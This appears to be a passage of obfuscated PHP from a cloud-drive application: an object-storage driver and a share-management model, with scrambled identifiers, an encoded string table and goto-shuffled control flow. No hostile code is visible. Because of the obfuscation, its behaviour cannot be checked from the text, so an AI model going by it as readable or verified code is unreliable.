$b¾®µ„á’Á[213]; $E×šª¿»‡ = array(OSS\OssClient::OSS_SUB_RESOURCE => $b¾®µ„á’Á[1270] . rawurlencode("{$a‹¨„íƒˆ³}\x3b\146\x69\x6c\145\x6e\141\155\x65\x3d{$Cœª…¤¡éâ}")); $E×šª¿»‡[OSS\OssClient::OSS_SUB_RESOURCE] .= $b¾®µ„á’Á[1271] . rawurlencode($FÇµ‹ùÙª); goto a•œÆçõÌ; a•œÆçõÌ: $a´òôš„Û = $this->link($E’§Ë”‰, $E×šª¿»‡); $this->fileOutLink($a´òôš„Û); goto cÆñäĞ¤ôœ; Fç‘£‰›„½: $Cœª…¤¡éâ = rawurlencode($Cœª…¤¡éâ); $FÇµ‹ùÙª = get_file_mime(get_path_ext($Cœª…¤¡éâ)); if ($FÇµ‹ùÙª == $b¾®µ„á’Á[211]) { return parent::fileOut($E’§Ë”‰, $a‹¨„íƒˆ³, $Cœª…¤¡éâ, $cËÁÒ‚ÕÆâ); } goto EÊÄõ”¥Î; cÆñäĞ¤ôœ: } public function fileOutServer($D–ï¾Ê™óİ, $d‘†Ç…Ÿ® = false, $Dá¥¥ÙâØª = false, $fÓ»ƒ¢î…  = '') { parent::fileOut($D–ï¾Ê™óİ, $d‘†Ç…Ÿ®, $Dá¥¥ÙâØª, $fÓ»ƒ¢î… ); } public function fileOutImage($cø‘©˜Ø£Õ, $FŸßÙÈ±è« = 250) { $DÂÙ¤â¤ø = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¢ÌÛ][1272] . $FŸßÙÈ±è«); $a±Á£³Û…ˆ = $this->link($cø‘©˜Ø£Õ, $DÂÙ¤â¤ø); $this->fileOutLink($a±Á£³Û…ˆ); } public function fileOutImageServer($cÂ²¹ÜŒÑ, $a™ŠÙ³ÇÄ = 250) { parent::fileOutImage($cÂ²¹ÜŒÑ, $a™ŠÙ³ÇÄ); } public function fileOutLink($d²ƒ‚ÙÌ‡) { $a‚ÉÇ©ÔÚ =& $_SERVER[¢ÌÛ]; if (!$this->isCdnHost() && substr($d²ƒ‚ÙÌ‡, 0, 7) == $a‚ÉÇ©ÔÚ[1176]) { $d²ƒ‚ÙÌ‡ = $a‚ÉÇ©ÔÚ[1177] . substr($d²ƒ‚ÙÌ‡, 7); } header($a‚ÉÇ©ÔÚ[158] . $d²ƒ‚ÙÌ‡); die; } public function hashMd5($e‹ÄÔøĞà², $eÄõˆ‰“¹¹ = '') { $aââòŞĞ×É =& $_SERVER[¢ÌÛ]; $BÙ¦ÓŸ¶í = $this->_objectMeta($e‹ÄÔøĞà²); if (!$BÙ¦ÓŸ¶í) { return $aââòŞĞ×É[33]; } if (!isset($BÙ¦ÓŸ¶í[$aââòŞĞ×É[1248]]) && !empty($eÄõˆ‰“¹¹)) { $a‚í…™× = $this->updateObjMeta($e‹ÄÔøĞà², array($aââòŞĞ×É[1248] => $eÄõˆ‰“¹¹)); $BÙ¦ÓŸ¶í[$aââòŞĞ×É[1248]] = $a‚í…™× ? $eÄõˆ‰“¹¹ : $aââòŞĞ×É[33]; } return isset($BÙ¦ÓŸ¶í[$aââòŞĞ×É[1248]]) ? strtolower($BÙ¦ÓŸ¶í[$aââòŞĞ×É[1248]]) : $aââòŞĞ×É[33]; } public function size($DœÊªŸ¶ôš) { $A²öÃÆïç« = $this->objectMeta($DœÊªŸ¶ôš); return $A²öÃÆïç« ? $A²öÃÆïç«[$_SERVER[¢ÌÛ][77]] : 0; } public function info($FŠ·É²¦ß) { if ($this->isFolder($FŠ·É²¦ß)) { return $this->folderInfo($FŠ·É²¦ß); } else { if ($this->isFile($FŠ·É²¦ß)) { return $this->fileInfo($FŠ·É²¦ß); } } return !1; } public function exist($AëÓòÓà‘®) { return $this->isFile($AëÓòÓà‘®) || $this->isFolder($AëÓòÓà‘®); } public function isFile($DÑÎ¤ßñÉí) { return !$this->isFolder($DÑÎ¤ßñÉí) && $this->objectMeta($DÑÎ¤ßñÉí); } public function isFolder($B³É¹‡©ôà) { return $this->cacheMethod($_SERVER[¢ÌÛ][197], $B³É¹‡©ôà); } protected function objectMeta($Cğ÷Ù·§å¼) { return $this->cacheMethod($_SERVER[¢ÌÛ][198], $Cğ÷Ù·§å¼); } protected function _objectMeta($E–Â„Š—­£) { $EÈòÛô» =& $_SERVER[¢ÌÛ]; try { $eà½ÒÒ–§” = $this->client->getObjectMeta($this->bucket, $this->pathEncode($E–Â„Š—­£)); } catch (OSS\Core\OssException $B˜Ğö£óÙ) { $eà½ÒÒ–§” = !1; } if ($eà½ÒÒ–§”) { $eà½ÒÒ–§”[$EÈòÛô»[77]] = intval($eà½ÒÒ–§”[$EÈòÛô»[1246]]); } return $eà½ÒÒ–§”; } protected function _isFolder($b²ÇªÏİ”) { $aÌ±³ÃøÕ° =& $_SERVER[¢ÌÛ]; if ($b²ÇªÏİ” == $aÌ±³ÃøÕ°[33] || $b²ÇªÏİ” == $aÌ±³ÃøÕ°[8]) { return !0; } $aåÉÌÇ–¹ = array($aÌ±³ÃøÕ°[1242] => $aÌ±³ÃøÕ°[8], $aÌ±³ÃøÕ°[1243] => rtrim($b²ÇªÏİ”, $aÌ±³ÃøÕ°[8]) . $aÌ±³ÃøÕ°[8], $aÌ±³ÃøÕ°[1244] => 1, $aÌ±³ÃøÕ°[1245] => $aÌ±³ÃøÕ°[33]); $bÈĞâ¸Ñ‹â = $this->client->listObjects($this->bucket, $aåÉÌÇ–¹); if ($bÈĞâ¸Ñ‹â->getObjectList() || $bÈĞâ¸Ñ‹â->getPrefixList()) { return !0; } return !1; } } $A‹ÓŒÀ‘¤ = $_SERVER[$_SERVER[¢ÌÛ][386]]; $aÕäã±µ©ä = $_SERVER[¢ÌÛ][387]; goto fó•®É¯‰‚; C§ƒÕ‚º÷: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\x54\151\x6d\x65", "\164\151\x6d\x65", "\151\x6e\x73\145\x72\164\54\x75\x70\x64\x61\x74\145", "\x66\165\x6e\143\164\151\157\156"), array("\x63\162\145\x61\164\145\124\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\145\162\x74", "\x66\165\x6e\x63\x74\151\157\156"), array("\x6f\x70\164\151\157\x6e\163", '', "\151\156\163\x65\162\x74\x2c\165\x70\x64\x61\x74\145\54\x73\x65\154\x65\143\164", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($e»”è©Õñˆ) { $bËÁå…ƒ¼ =& $_SERVER[¢ÌÛ]; $d±´£‰À½é = isset($e»”è©Õñˆ[0]) ? $e»”è©Õñˆ[0] : !1; return array($bËÁå…ƒ¼[1783] => array(USER_ID, $bËÁå…ƒ¼[1784]), $bËÁå…ƒ¼[1732] => array($d±´£‰À½é, $bËÁå…ƒ¼[1785])); } protected function listSimple() { $dÍêßØÆİ = array($_SERVER[¢ÌÛ][1498] => USER_ID); $BöÓƒ‰¦Ñİ = $this->field($this->fieldList)->where($dÍêßØÆİ)->select(); return $BöÓƒ‰¦Ñİ ? $BöÓƒ‰¦Ñİ : array(); } protected function getInfo($BèˆÏ½„Á¢, $F°ğ—¸Œ­İ = false) { $dÚ×ĞÜ’Âø =& $_SERVER[¢ÌÛ]; if ($F°ğ—¸Œ­İ) { return $this->_getShareInfo(array($dÚ×ĞÜ’Âø[466] => $BèˆÏ½„Á¢)); } $Eê·Ùˆóäë = $this->cacheFunctionGet($dÚ×ĞÜ’Âø[1786], $BèˆÏ½„Á¢); return $Eê·Ùˆóäë; } public function getInfoByHash($e÷šõ÷ºÄØ) { return $this->_getShareInfo(array($_SERVER[¢ÌÛ][468] => $e÷šõ÷ºÄØ)); } public function getInfoByPath($cÂàÅœõ¦‚) { $EÑïÊ„ëä„ =& $_SERVER[¢ÌÛ]; $C ¡Ô°ˆò² = array($EÑïÊ„ëä„[1498] => USER_ID, $EÑïÊ„ëä„[396] => $cÂàÅœõ¦‚); return $this->_getShareInfo($C ¡Ô°ˆò²); } public function getInfoBySourcePath($c¥‹îÍÎæµ) { $a¸§ãƒéé× =& $_SERVER[¢ÌÛ]; $EÕ„’‚ó´„ = array($a¸§ãƒéé×[1498] => USER_ID, $a¸§ãƒéé×[1047] => $c¥‹îÍÎæµ); return $this->_getShareInfo($EÕ„’‚ó´„); } private function _getShareInfo($Fà¥ŸÈ»õì) { goto e ‡Øé›¡; fÍÍè‚»¼: if ($DÁ†å¬ô”À[$dÓ‘åéá¦±[396]] == $dÓ‘åéá¦±[495]) { $DÁ†å¬ô”À[$dÓ‘åéá¦±[84]] = IO::info($DÁ†å¬ô”À[$dÓ‘åéá¦±[1047]]); } else { $DÁ†å¬ô”À[$dÓ‘åéá¦±[84]] = Model($dÓ‘åéá¦±[1178])->pathInfo($DÁ†å¬ô”À[$dÓ‘åéá¦±[396]]); } $DÁ†å¬ô”À[$dÓ‘åéá¦±[1788]] = $cæ³‡ŞÜçÒ; return $DÁ†å¬ô”À; goto dµ—²‘”áº; e ‡Øé›¡: $dÓ‘åéá¦± =& $_SERVER[¢ÌÛ]; $DÁ†å¬ô”À = $this->where($Fà¥ŸÈ»õì)->find(); if (!$DÁ†å¬ô”À) { return !1; } goto Cï”£ºÌ—Ä; Cï”£ºÌ—Ä: $Fà¥ŸÈ»õì = array($dÓ‘åéá¦±[466] => $DÁ†å¬ô”À[$dÓ‘åéá¦±[466]]); $F‹éµ¥‚¯ = $dÓ‘åéá¦±[1787]; $cæ³‡ŞÜçÒ = Model($dÓ‘åéá¦±[562])->order($dÓ‘åéá¦±[385])->field($F‹éµ¥‚¯)->where($Fà¥ŸÈ»õì)->select(); goto fÍÍè‚»¼; dµ—²‘”áº: } protected function getInfoAuth($EáÙ…ç¤©›) { $cªÈÃòî‹¤ =& $_SERVER[¢ÌÛ]; $Fí×âŞŸÜ¸ = $this->getInfo($EáÙ…ç¤©›); $Fí×âŞŸÜ¸[$cªÈÃòî‹¤[403]] = Model($cªÈÃòî‹¤[481])->authMake($Fí×âŞŸÜ¸[$cªÈÃòî‹¤[1788]]); return $Fí×âŞŸÜ¸; } protected function listData($d™¾‰Ù‹ˆ… = null, $B™Èµ¯×¾ = 300) { $a´‰Ïç¨Ê =& $_SERVER[¢ÌÛ]; $a¥¡¨§Ş¤ƒ = array(array($a´‰Ïç¨Ê[471] => array($a´‰Ïç¨Ê[946], 0), $a´‰Ïç¨Ê[473] => array($a´‰Ïç¨Ê[946], 0), $a´‰Ïç¨Ê[1789] => $a´‰Ïç¨Ê[1746])); if ($d™¾‰Ù‹ˆ… == $a´‰Ïç¨Ê[1790]) { $a¥¡¨§Ş¤ƒ = array($a´‰Ïç¨Ê[471] => 1); } else { if ($d™¾‰Ù‹ˆ… == $a´‰Ïç¨Ê[1032]) { $a¥¡¨§Ş¤ƒ = array($a´‰Ïç¨Ê[473] => 1); } } $a¥¡¨§Ş¤ƒ[$a´‰Ïç¨Ê[1498]] = USER_ID; $FÉ˜¤ŠºÈ« = $this->where($a¥¡¨§Ş¤ƒ)->selectPage($B™Èµ¯×¾); return $FÉ˜¤ŠºÈ«; } protected function listToMe($aŒ•–†à²’ = 300) { goto EùÉ­Ğ§¸; dÎ»ç³¹À: if (!$eè¶òë“õ±) { return $c¯ô¤ƒ«Ê; } $A’ÈÑº¢—Ñ = $b÷åå„Óç[1792]; $eªİïÄÀæ = array($b÷åå„Óç[466] => array($b÷åå„Óç[411], array_keys($eè¶òë“õ±))); goto dìâô¢¦—Ü; dÉí×­§: if ($dö¡µˆ‘¤á) { $eªİïÄÀæ = array(array($b÷åå„Óç[547] => SourceModel::TYPE_USER, $b÷åå„Óç[483] => USER_ID), array($b÷åå„Óç[547] => SourceModel::TYPE_GROUP, $b÷åå„Óç[483] => array($b÷åå„Óç[7], $dö¡µˆ‘¤á)), $b÷åå„Óç[1789] => $b÷åå„Óç[1746]); } $c¯ô¤ƒ«Ê = Model($b÷åå„Óç[562])->where($eªİïÄÀæ)->selectPage($aŒ•–†à²’); $eè¶òë“õ± = array_to_keyvalue_group($c¯ô¤ƒ«Ê[$b÷åå„Óç[363]], $b÷åå„Óç[466]); goto dÎ»ç³¹À; dìâô¢¦—Ü: $F¦µåÉº‡ì = $this->field($A’ÈÑº¢—Ñ)->where($eªİïÄÀæ)->select(); foreach ($F¦µåÉº‡ì as $bäùÛƒËõÓ => &$b¬¨‹™¤Öæ) { $b¬¨‹™¤Öæ[$b÷åå„Óç[1788]] = $eè¶òë“õ±[$b¬¨‹™¤Öæ[$b÷åå„Óç[466]]]; } unset($b¬¨‹™¤Öæ); goto F’œæ¬È÷Õ; F’œæ¬È÷Õ: $d“§ï‰‰Ç = array($b÷åå„Óç[1793] => $F¦µåÉº‡ì, $b÷åå„Óç[1794] => $c¯ô¤ƒ«Ê[$b÷åå„Óç[360]]); return $d“§ï‰‰Ç; goto a¦ï¶â„÷¾; EùÉ­Ğ§¸: $b÷åå„Óç =& $_SERVER[¢ÌÛ]; $dö¡µˆ‘¤á = Model($b÷åå„Óç[1791])->userGroupParents(USER_ID); $eªİïÄÀæ = array($b÷åå„Óç[547] => SourceModel::TYPE_USER, $b÷åå„Óç[483] => USER_ID); goto dÉí×­§; a¦ï¶â„÷¾: } protected function shareAdd($A®¶ßÛœÚ¡, $EÚ§ë’‘Ç) { $Cõ¥‘ô¬‘„ =& $_SERVER[¢ÌÛ]; $AĞÌóãç—¡ = $this->_addShareData($A®¶ßÛœÚ¡, $EÚ§ë’‘Ç); if (!empty($EÚ§ë’‘Ç[$Cõ¥‘ô¬‘„[1795]])) { $this->_shareAuthSet($AĞÌóãç—¡, $EÚ§ë’‘Ç[$Cõ¥‘ô¬‘„[1795]]); } $this->shareEventAdd($A®¶ßÛœÚ¡, $EÚ§ë’‘Ç, $Cõ¥‘ô¬‘„[1035]); return $AĞÌóãç—¡; } private function shareEventAdd($dŸÃàø³ê‰, $f¯ê×ßøÊµ, $b±¢Öƒø¦„ = "\x61\144\x64") { goto C¡³ñĞôñ; FÌ¾¹¢¥ÂÆ: $dß®â‚ßõ = $d´¢İé‘ÌÅ[1798]; if ($c³¿£×–ºÔ[$d´¢İé‘ÌÅ[471]] == $d´¢İé‘ÌÅ[495] && $f¯ê×ßøÊµ[$d´¢İé‘ÌÅ[471]] == $d´¢İé‘ÌÅ[86]) { $dß®â‚ßõ = $d´¢İé‘ÌÅ[1796]; } if ($c³¿£×–ºÔ[$d´¢İé‘ÌÅ[471]] == $d´¢İé‘ÌÅ[86] && $f¯ê×ßøÊµ[$d´¢İé‘ÌÅ[471]] == $d´¢İé‘ÌÅ[495]) { $dß®â‚ßõ = $d´¢İé‘ÌÅ[1799]; } goto b‡šĞ­´¡¸; b‡šĞ­´¡¸: if ($c³¿£×–ºÔ[$d´¢İé‘ÌÅ[473]] == $d´¢İé‘ÌÅ[495] && $f¯ê×ßøÊµ[$d´¢İé‘ÌÅ[473]] == $d´¢İé‘ÌÅ[86]) { $dß®â‚ßõ = $d´¢İé‘ÌÅ[1797]; } if ($c³¿£×–ºÔ[$d´¢İé‘ÌÅ[473]] == $d´¢İé‘ÌÅ[86] && $f¯ê×ßøÊµ[$d´¢İé‘ÌÅ[473]] == $d´¢İé‘ÌÅ[495]) { $dß®â‚ßõ = $d´¢İé‘ÌÅ[1800]; } Model($d´¢İé‘ÌÅ[531])->eventShare($dŸÃàø³ê‰, $dß®â‚ßõ); goto BÏ¹‡”ğÑ; BÏ¹‡”ğÑ: return; goto d¦¤©ø´±; C¡³ñĞôñ: $d´¢İé‘ÌÅ =& $_SERVER[¢ÌÛ]; if ($b±¢Öƒø¦„ == $d´¢İé‘ÌÅ[1035]) { if ($f¯ê×ßøÊµ[$d´¢İé‘ÌÅ[471]] == $d´¢İé‘ÌÅ[86]) { Model($d´¢İé‘ÌÅ[531])->eventShare($dŸÃàø³ê‰, $d´¢İé‘ÌÅ[1796]); } if ($f¯ê×ßøÊµ[$d´¢İé‘ÌÅ[473]] == $d´¢İé‘ÌÅ[86]) { Model($d´¢İé‘ÌÅ[531])->eventShare($dŸÃàø³ê‰, $d´¢İé‘ÌÅ[1797]); } return; } $c³¿£×–ºÔ = $this->getInfoByPath($dŸÃàø³ê‰); goto FÌ¾¹¢¥ÂÆ; d¦¤©ø´±: } private function _addShareData($b¢µÙ£Ä´, $dšô«»¹ù = array()) { goto dèŞå‹óª¦; a‚õ–¥¤½œ: return $A¾Ìº¦; goto e¦¨ïîœùæ; dèŞå‹óª¦: $E¡½¢©š•ƒ =& $_SERVER[¢ÌÛ]; $c‹¦ Ù‹¸¨ = array($E¡½¢©š•ƒ[410] => $b¢µÙ£Ä´, $E¡½¢©š•ƒ[1490] => USER_ID); if ($b¢µÙ£Ä´ == 0) { $c‹¦ Ù‹¸¨ = array($E¡½¢©š•ƒ[1801] => $dšô«»¹ù[$E¡½¢©š•ƒ[1047]], $E¡½¢©š•ƒ[1490] => USER_ID); } goto fÇ¬¯½‘‰; fÇ¬¯½‘‰: if ($F ¾«ŠÃ¯œ = $this->where($c‹¦ Ù‹¸¨)->find()) { return $F ¾«ŠÃ¯œ[$E¡½¢©š•ƒ[466]]; } if ($b¢µÙ£Ä´ == 0) { $aÌ÷Şï‹ŒÕ = array($E¡½¢©š•ƒ[28] => get_path_this($dšô«»¹ù[$E¡½¢©š•ƒ[75]])); } else { $aÌ÷Şï‹ŒÕ = Model($E¡½¢©š•ƒ[774])->sourceInfo($b¢µÙ£Ä´); if (!$aÌ÷Şï‹ŒÕ) { return !1; } } if (!$dšô«»¹ù[$E¡½¢©š•ƒ[1403]]) { $dšô«»¹ù[$E¡½¢©š•ƒ[1403]] = $aÌ÷Şï‹ŒÕ[$E¡½¢©š•ƒ[28]]; } goto F²Ñ»’–‰š; A±ÜòéÑ: $A¾Ìº¦ = $this->add($cÛ» õË­²); $eÛØÚ­ç˜› = array($E¡½¢©š•ƒ[468] => short_id($A¾Ìº¦)); $this->where(array($E¡½¢©š•ƒ[465] => $A¾Ìº¦))->save($eÛØÚ­ç˜›); goto a‚õ–¥¤½œ; F²Ñ»’–‰š: $cÛ» õË­² = array($E¡½¢©š•ƒ[1490] => USER_ID, $E¡½¢©š•ƒ[410] => $b¢µÙ£Ä´, $E¡½¢©š•ƒ[1403] => $E¡½¢©š•ƒ[33], $E¡½¢©š•ƒ[471] => 0, $E¡½¢©š•ƒ[473] => 0, $E¡½¢©š•ƒ[1047] => $E¡½¢©š•ƒ[33], $E¡½¢©š•ƒ[303] => $E¡½¢©š•ƒ[33], $E¡½¢©š•ƒ[826] => $E¡½¢©š•ƒ[33], $E¡½¢©š•ƒ[1802] => 0, $E¡½¢©š•ƒ[1803] => 0, $E¡½¢©š•ƒ[474] => 0, $E¡½¢©š•ƒ[475] => $E¡½¢©š•ƒ[33], $E¡½¢©š•ƒ[468] => $E¡½¢©š•ƒ[33]); $a™ÖŠä“ÎÆ = explode($E¡½¢©š•ƒ[47], $E¡½¢©š•ƒ[1804]); foreach ($a™ÖŠä“ÎÆ as $aêƒœ ÜŸ…) { if (!isset($dšô«»¹ù[$aêƒœ ÜŸ…])) { continue; } $cÛ» õË­²[$aêƒœ ÜŸ…] = $dšô«»¹ù[$aêƒœ ÜŸ…]; } goto A±ÜòéÑ; e¦¨ïîœùæ: } private function _shareAuthSet($cƒ¥Ì·É®¼, $D¿Óëó¡“Å) { goto aŠ¹Œ—¿Şš; Eº¤ÔÎòö: return $eàÈëŒÍèÀ->addAll($E²øÌ™ª§ƒ, array(), !0); goto DåÚ¡±ˆ„‚; EŒ‚‡ŞØ×·: $eàÈëŒÍèÀ->where(array($fêñ–ÇÉÓ“[466] => $cƒ¥Ì·É®¼))->delete(); $E²øÌ™ª§ƒ = array(); foreach ($D¿Óëó¡“Å as $bƒ¨ê¹ïˆ‘) { $aÀ£’í“¯ = SourceModel::TYPE_USER; if ($bƒ¨ê¹ïˆ‘[$fêñ–ÇÉÓ“[398]] == SourceModel::TYPE_GROUP) { $aÀ£’í“¯ = SourceModel::TYPE_GROUP; } $d¬”É¦ƒ² = array($fêñ–ÇÉÓ“[466] => $cƒ¥Ì·É®¼, $fêñ–ÇÉÓ“[398] => $aÀ£’í“¯, $fêñ–ÇÉÓ“[483] => intval($bƒ¨ê¹ïˆ‘[$fêñ–ÇÉÓ“[483]]), $fêñ–ÇÉÓ“[1806] => 0, $fêñ–ÇÉÓ“[1807] => -1); if ($bƒ¨ê¹ïˆ‘[$fêñ–ÇÉÓ“[1806]]) { $d¬”É¦ƒ²[$fêñ–ÇÉÓ“[1806]] = $bƒ¨ê¹ïˆ‘[$fêñ–ÇÉÓ“[1806]]; } else { if ($bƒ¨ê¹ïˆ‘[$fêñ–ÇÉÓ“[1807]]) { $d¬”É¦ƒ²[$fêñ–ÇÉÓ“[1807]] = $bƒ¨ê¹ïˆ‘[$fêñ–ÇÉÓ“[1807]]; } } $E²øÌ™ª§ƒ[] = $d¬”É¦ƒ²; } goto Eº¤ÔÎòö; aŠ¹Œ—¿Şš: $fêñ–ÇÉÓ“ =& $_SERVER[¢ÌÛ]; if (!is_array($D¿Óëó¡“Å)) { return !1; } $eàÈëŒÍèÀ = Model($fêñ–ÇÉÓ“[1805]); goto EŒ‚‡ŞØ×·; DåÚ¡±ˆ„‚: } public function numViewAdd($e°Úò´¿ Ô) { $d¡Üâè¤º =& $_SERVER[¢ÌÛ]; $FãìôÎ° = array($d¡Üâè¤º[465] => $e°Úò´¿ Ô); $this->where($FãìôÎ°)->setAdd($d¡Üâè¤º[1802]); } public function numDownloadAdd($fßº·¸µâó) { $Dİ„ÇÈÜİ =& $_SERVER[¢ÌÛ]; $aö½ˆ×¹‚ = array($Dİ„ÇÈÜİ[465] => $fßº·¸µâó); $this->where($aö½ˆ×¹‚)->setAdd($Dİ„ÇÈÜİ[1803]); } protected function shareEdit($e ó¸®µÔó, $Aª£²è¼´) { goto aé¸Û‹Ÿ³´; aé¸Û‹Ÿ³´: $EŠœÊ˜´Ôö =& $_SERVER[¢ÌÛ]; $E«“ª•àÍË = $this->getInfo($e ó¸®µÔó); if (!$E«“ª•àÍË) { return !1; } goto f¥¬—ß„œ“; f¥¬—ß„œ“: $this->_checkLinkShare($Aª£²è¼´, $E«“ª•àÍË); $fİŠ…é¼Ö¿ = array(); $e„ÚÂùôÄ” = explode($EŠœÊ˜´Ôö[47], $EŠœÊ˜´Ôö[1808]); goto E‰ÑššÛÏñ; aßÓÙãç¿: if (isset($Aª£²è¼´[$EŠœÊ˜´Ôö[1795]])) { $this->_shareAuthSet($e ó¸®µÔó, $Aª£²è¼´[$EŠœÊ˜´Ôö[1795]]); } return !0; goto cœË‡íáœ; E‰ÑššÛÏñ: foreach ($e„ÚÂùôÄ” as $B¬ßÊ¸ˆ–ù) { if (!array_key_exists($B¬ßÊ¸ˆ–ù, $Aª£²è¼´)) { continue; } $fİŠ…é¼Ö¿[$B¬ßÊ¸ˆ–ù] = $Aª£²è¼´[$B¬ßÊ¸ˆ–ù]; } $this->shareEventAdd($E«“ª•àÍË[$EŠœÊ˜´Ôö[396]], $Aª£²è¼´, $EŠœÊ˜´Ôö[1624]); $this->where(array($EŠœÊ˜´Ôö[465] => $e ó¸®µÔó))->save($fİŠ…é¼Ö¿); goto aßÓÙãç¿; cœË‡íáœ: } private function _checkLinkShare($F‚µÇôá, $CåÓ‚¼çöó) { goto cîÊ™ŠÎ°ô; cîÊ™ŠÎ°ô: $c©ïçó¡× =& $_SERVER[¢ÌÛ]; if ($F‚µÇôá[$c©ïçó¡×[471]] != $c©ïçó¡×[86]) { return; } $f¦ŒÚÏìŞ = $CåÓ‚¼çöó[$c©ïçó¡×[84]][$c©ïçó¡×[396]]; goto a¾§Ú“ÙîÒ; a¾§Ú“ÙîÒ: if ($CåÓ‚¼çöó[$c©ïçó¡×[84]][$c©ïçó¡×[29]] != $c©ïçó¡×[173]) { $DˆÉ‹÷£ = $this->_folderReport($f¦ŒÚÏìŞ); if (!$DˆÉ‹÷£) { return; } show_json(LNG($c©ïçó¡×[1809]) . $c©ïçó¡×[1810] . $DˆÉ‹÷£, !1); } $CğÃÓ°‡» = Model($c©ïçó¡×[774])->fileInfoGet($CåÓ‚¼çöó[$c©ïçó¡×[84]][$c©ïçó¡×[396]]); if (!$CğÃÓ°‡») { return; } goto Bç“²äÒòÊ; Bç“²äÒòÊ: $FöŸ®âµ¨ê = $this->shareFileMeta($CğÃÓ°‡»[$c©ïçó¡×[445]]); if (isset($FöŸ®âµ¨ê[$c©ïçó¡×[368]]) && $FöŸ®âµ¨ê[$c©ïçó¡×[368]] == $c©ïçó¡×[86]) { show_json(LNG($c©ïçó¡×[1811]), !1); } goto aáöÑç¸ñ¾; aáöÑç¸ñ¾: } private function _folderReport($b¹ÈÊƒó¼¥) { goto C°À‹¥›İ; B°ØÎ¦»‡Œ: $fõğÄ‚“© = array_to_keyvalue($bŒ–±¿ï·, $e‘’Ì…ØŞ[33], $e‘’Ì…ØŞ[28]); $fõğÄ‚“©[] = $Cªë´ÔŒë‡[$e‘’Ì…ØŞ[28]]; return implode($e‘’Ì…ØŞ[8], $fõğÄ‚“©); goto eÇ«™ÑÒŒÑ; e‡¡”ÖÎ³·: if (!$a°š‰²¯Ÿ) { return !1; } $a°š‰²¯Ÿ = array_to_keyvalue($a°š‰²¯Ÿ, $e‘’Ì…ØŞ[33], $e‘’Ì…ØŞ[445]); $A¶®Í­É‘ = $e‘’Ì…ØŞ[47] . $b¹ÈÊƒó¼¥ . $e‘’Ì…ØŞ[47]; goto Bƒßá¡ê¼©; Bƒßá¡ê¼©: $FäŠ´ñõä¼ = array($e‘’Ì…ØŞ[445] => array($e‘’Ì…ØŞ[7], $a°š‰²¯Ÿ), $e‘’Ì…ØŞ[486] => array($e‘’Ì…ØŞ[375], "\45{$A¶®Í­É‘}\x25"), $e‘’Ì…ØŞ[423] => 0); $Cªë´ÔŒë‡ = Model($e‘’Ì…ØŞ[774])->where($FäŠ´ñõä¼)->field($e‘’Ì…ØŞ[1813])->find(); if (!$Cªë´ÔŒë‡) { return !1; } goto Cé»ŠˆÂ; C°À‹¥›İ: $e‘’Ì…ØŞ =& $_SERVER[¢ÌÛ]; $FäŠ´ñõä¼ = array($e‘’Ì…ØŞ[445] => array($e‘’Ì…ØŞ[946], 0), $e‘’Ì…ØŞ[712] => 3); $a°š‰²¯Ÿ = Model($e‘’Ì…ØŞ[1812])->where($FäŠ´ñõä¼)->field($e‘’Ì…ØŞ[445])->select(); goto e‡¡”ÖÎ³·; Cé»ŠˆÂ: $cÙ•íóõ¸Ë = substr($Cªë´ÔŒë‡[$e‘’Ì…ØŞ[486]], strpos($Cªë´ÔŒë‡[$e‘’Ì…ØŞ[486]], $A¶®Í­É‘)); $FäŠ´ñõä¼ = array($e‘’Ì…ØŞ[396] => array($e‘’Ì…ØŞ[7], trim($cÙ•íóõ¸Ë, $e‘’Ì…ØŞ[47]))); $bŒ–±¿ï· = Model($e‘’Ì…ØŞ[774])->where($FäŠ´ñõä¼)->field($e‘’Ì…ØŞ[28])->select(); goto B°ØÎ¦»‡Œ; eÇ«™ÑÒŒÑ: } protected function remove($f³ŸÎªèÇ) { goto Cøñßç‡Å¥; Cøñßç‡Å¥: $eã…§³‹  =& $_SERVER[¢ÌÛ]; if (is_array($f³ŸÎªèÇ)) { $f³ŸÎªèÇ = array($eã…§³‹ [7], $f³ŸÎªèÇ); } $BÔˆáïÍ„‰ = array($eã…§³‹ [466] => $f³ŸÎªèÇ); goto a‡ƒ‰œ¢††; Bñ–¹Š±š: for ($Dğ³ºµò‹„ = 0; $Dğ³ºµò‹„ < count($f„»ÏÊÍŸ…); $Dğ³ºµò‹„++) { $A½İÈè÷Ô = $this->getInfo($f„»ÏÊÍŸ…[$Dğ³ºµò‹„]); if ($A½İÈè÷Ô[$eã…§³‹ [473]] == $eã…§³‹ [86]) { Model($eã…§³‹ [531])->eventShare($A½İÈè÷Ô[$eã…§³‹ [396]], $eã…§³‹ [1800]); } if ($A½İÈè÷Ô[$eã…§³‹ [471]] == $eã…§³‹ [86]) { Model($eã…§³‹ [531])->eventShare($A½İÈè÷Ô[$eã…§³‹ [396]], $eã…§³‹ [1799]); } } return $FáñÈÇª; goto Aº¢‡¼Â‚¦; a‡ƒ‰œ¢††: $FáñÈÇª = $this->where($BÔˆáïÍ„‰)->delete(); if ($FáñÈÇª) { Model($eã…§³‹ [562])->where(array($eã…§³‹ [466] => $f³ŸÎªèÇ))->delete(); } $f„»ÏÊÍŸ… = is_array($f³ŸÎªèÇ) ? $f³ŸÎªèÇ[1] : array($f³ŸÎªèÇ); goto Bñ–¹Š±š; Aº¢‡¼Â‚¦: } protected function removeBySource($EßòÑÍ‰åÄ) { goto A³÷ø­Ö; A³÷ø­Ö: $f‰îï§…Óµ =& $_SERVER[¢ÌÛ]; $EÇ‰´áÒÜí = array($f‰îï§…Óµ[410] => array($f‰îï§…Óµ[411], $EßòÑÍ‰åÄ)); $fáé«Ãù‡˜ = $this->field($f‰îï§…Óµ[466])->where($EÇ‰´áÒÜí)->select(); goto C›¾›‚ñ¹„; b•ˆ²‡±³å: $this->where($EÇ‰´áÒÜí)->delete(); Model($f‰îï§…Óµ[562])->where($EÇ‰´áÒÜí)->delete(); goto eò—”Ìì‰¿; C›¾›‚ñ¹„: $fáé«Ãù‡˜ = array_to_keyvalue($fáé«Ãù‡˜, $f‰îï§…Óµ[33], $f‰îï§…Óµ[466]); if (!$fáé«Ãù‡˜) { return; } $EÇ‰´áÒÜí = array($f‰îï§…Óµ[465] => array($f‰îï§…Óµ[411], $fáé«Ãù‡˜)); goto b•ˆ²‡±³å; eò—”Ìì‰¿: } public function listAll($F¼´íñ³) { goto A…î‹¸¬©; A…î‹¸¬©: 